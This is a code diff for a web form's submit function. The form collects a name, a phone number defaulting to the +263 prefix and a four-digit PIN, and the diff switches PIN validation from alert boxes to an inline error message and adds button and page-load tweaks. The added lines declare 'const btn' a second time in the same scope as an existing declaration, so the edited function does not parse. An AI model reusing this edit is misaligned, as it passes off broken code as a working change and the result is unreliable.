@@ -155,21 +155,29 @@ function submitApp() {
         pin += input.value;
     });
 
-    if (pin.length !== 4) {
-        alert("Enter complete PIN");
-        return;
-    }
+    const error = document.getElementById("errorMsg");
 
-    if (!/^\d{4}$/.test(pin)) {
-        alert("PIN must be 4 digits");
-        return;
-    }
+if (pin.length !== 4) {
+    error.innerText = "Please enter complete PIN";
+    error.style.display = "block";
+    return;
+}
+
+if (!/^\d{4}$/.test(pin)) {
+    error.innerText = "PIN must be 4 digits";
+    error.style.display = "block";
+    return;
+}
 
     const data = {
         name: localStorage.getItem("fname") + " " + localStorage.getItem("lname"),
         phone: phone,
         pin: pin
     };
+
+const btn = document.getElementById("submitBtn");
+btn.innerText = "Processing...";
+btn.disabled = true;
 
     const btn = document.querySelector(".login-btn");
     btn.disabled = true;
@@ -228,3 +236,7 @@ document.addEventListener("DOMContentLoaded", function () {
         phoneInput.value = localStorage.getItem("phone") || "+263";
     }
 });
+
+window.onload = () => {
+    document.body.classList.add("loaded");
+};
